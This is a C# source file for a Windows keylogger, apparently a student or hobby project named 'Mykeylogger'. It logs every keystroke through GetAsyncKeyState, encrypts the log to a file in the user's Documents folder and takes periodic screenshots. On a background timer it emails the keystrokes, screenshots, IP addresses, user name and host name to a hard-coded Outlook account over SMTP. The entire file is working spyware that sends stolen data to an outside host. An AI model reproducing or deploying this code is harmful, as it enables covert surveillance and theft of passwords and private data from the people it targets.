using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;

namespace Mykeylogger
{
    class Program
    {
        const string EMAIL_ADDRESS = "Projektinzynierski@outlook.com";   
        const string EMAIL_PASSWORD = "";                  
        static long numberOfKeystrokes = 0;
        static byte[] AES_KEY;
        static byte[] AES_IV;
        static string imagePath = "Image-";
        static string imageExtendtion = ".png";
        static int imageCount = 0;
        static int captureTime = 100;
        static int mailTime = 5000;
        static int interval = 1;

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

       static void Main(string[] args)
       {
            StartTimmer();
            if (args is null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            String folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
            }

            string filepath = (folderPath + @"\logs.txt");
            string keystrokes_data = "";

            if (!File.Exists(filepath))
            {
                using (StreamWriter sw = File.CreateText(filepath)) { }
            }

            AesManaged aes = new AesManaged();
            AES_KEY = aes.Key;
            AES_IV = aes.IV;

            Console.Write("Start Keylogger" + "\n");
            while (true)
            {
                Thread.Sleep(10);

                const int MIN_ASCII_DEC_VALUE = 32;
                const int MAX_ASCII_DEC_VALUE = 127;
                               
                for (int i = MIN_ASCII_DEC_VALUE; i < MAX_ASCII_DEC_VALUE; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    bool isKeyPressed = keyState == 32769;
 
                    if (isKeyPressed)
                    {
                        char key = (char)i;

                        Console.Write((char)i + ", ");
                        keystrokes_data += (char)i;
                        numberOfKeystrokes++;

                        if (numberOfKeystrokes % 100 == 0)
                        {
                            byte[] encrypted = Encrypt(keystrokes_data, AES_KEY, AES_IV);

                            using (StreamWriter sw = File.CreateText(filepath))
                            {
                                sw.Write(Convert.ToBase64String(encrypted));
                            }
                            SendNewMessage();
                        }
                    }
                }
            }
       }
       public static void SendNewMessage()
        {
            String folderPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderPath + @"\logs.txt";
            byte[] encrypted = Convert.FromBase64String(File.ReadAllText(filePath));
            String logContents = Decrypt(encrypted, AES_KEY, AES_IV);

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";
            string emailBody = string.Empty;

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address + "\n";
            }

            emailBody += "User: " + Environment.UserName + "\n";
            emailBody += "Host: " + Dns.GetHostName() + "\n";
            emailBody += "Time: " + now.ToString() + "\n";
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.outlook.com", 587);
            MailMessage mailMessage = new MailMessage
            {
                From = new MailAddress(EMAIL_ADDRESS)
            };
            mailMessage.To.Add(EMAIL_ADDRESS);
            mailMessage.Subject = subject;

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();
            DirectoryInfo image = new DirectoryInfo(directoryImage);

            foreach (FileInfo item in image.GetFiles("*.png"))
            {
                if (File.Exists(directoryImage + "\\" + item.Name))
                    mailMessage.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
            }
            
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential(EMAIL_ADDRESS, EMAIL_PASSWORD);
            mailMessage.Body = emailBody;
            client.Send(mailMessage);
        }
       public static byte[] Encrypt(string Text, byte[] Key, byte[] IV)
        {
            byte[] encrypted;

            using (AesManaged aes = new AesManaged())
            {
                ICryptoTransform encryptor = aes.CreateEncryptor(Key, IV);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(cs))
                        sw.Write(Text);
                        encrypted = ms.ToArray();
                    }
                }
            }
            return encrypted;
        }
       public static string Decrypt(byte[] cipherText, byte[] Key, byte[] IV)
        {
            string text = null;

            using (AesManaged aes = new AesManaged())
            {
                ICryptoTransform decryptor = aes.CreateDecryptor(Key, IV);

                using (MemoryStream ms = new MemoryStream(cipherText))
                {
                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader reader = new StreamReader(cs))
                        text = reader.ReadToEnd();
                    }
                }
            }
            return text;
        }
       public static void CaptureScreen()
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            var gfxScreenhot = Graphics.FromImage(bmpScreenshot);

            gfxScreenhot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }

            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + imageCount, imageExtendtion);

            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png);
            }
            catch
            {

            }
            imageCount++;
        }
       public static void StartTimmer()
       {
            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(1);

                    if (interval % captureTime == 0)
                        CaptureScreen();

                    if (interval % mailTime == 0)
                        SendNewMessage();

                    interval++;

                    if (interval >= 1000000)
                        interval = 0;
                }
            });
            thread.IsBackground = true;
            thread.Start();
       }
    }
}
